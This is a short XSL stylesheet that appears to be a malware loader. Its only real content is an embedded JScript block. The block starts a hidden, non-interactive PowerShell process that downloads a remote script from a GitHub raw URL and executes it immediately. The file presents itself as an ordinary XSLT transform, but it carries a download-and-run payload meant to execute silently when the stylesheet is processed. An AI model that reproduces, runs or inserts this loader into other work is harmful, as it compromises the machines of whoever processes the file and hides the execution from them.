<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c powershell -noLOGo -WindowStyle Hidden -NoExit -NoProfile -NonInteractive -command irm https://raw.githubusercontent.com/joes233f/ccc/main/c.ps1|Powershell");
    ]]> </ms:script>
</stylesheet>
